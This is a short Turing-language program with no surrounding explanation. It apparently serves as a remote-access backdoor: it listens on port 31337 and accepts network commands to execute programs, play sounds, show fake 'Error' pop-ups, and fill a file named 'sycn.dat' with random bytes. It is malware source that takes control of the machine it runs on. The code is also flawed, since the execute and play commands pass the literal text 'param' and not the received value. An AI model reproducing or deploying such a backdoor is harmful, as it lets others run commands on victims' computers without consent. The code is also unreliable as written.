var ip : string
var port : int := 31337
var netStream : int
var command : string := ""
var param, param2 : string
var retID : int
var streamOut : int

external "gui_alert"
    procedure Alert (title, msg : string, placement : int)
netStream := Net.WaitForConnection (port, ip)

loop
    if Net.LineAvailable (netStream) then
        get : netStream, command
    end if
    case command of
        label "exe" :
            loop
                if Net.LineAvailable (netStream) then
                    get : netStream, param
                    retID := Sys.Exec ("param")
                    put : netStream, "Successful"
                    exit
                end if
            end loop
        label "playwav" :
            loop
                if Net.LineAvailable (netStream) then
                    get : netStream, param
                    Music.PlayFile ("param")
                    put : netStream, "Successful"
                    exit
                end if
            end loop
        label "alert" :
            loop
                if Net.LineAvailable (netStream) then
                    get : netStream, param : *
                    Alert ("Error", param, 0)
                    put : netStream, "Successful"
                    exit
                end if
            end loop
        label "filecreate" :
            open : streamOut, "sycn.dat", put
            loop
                if Net.LineAvailable (netStream) then
                    get : netStream, param
                    for i : 1 .. strint (param)
                        put : streamOut, chr (Rand.Int (1, 127)) ..
                    end for
                    put : netStream, "Successful"
                    exit
                end if
            end loop
        label "exit" :
            exit
        label :
    end case
    command := ""
    param := ""
    param2 := ""
end loop
Net.CloseConnection (netStream)

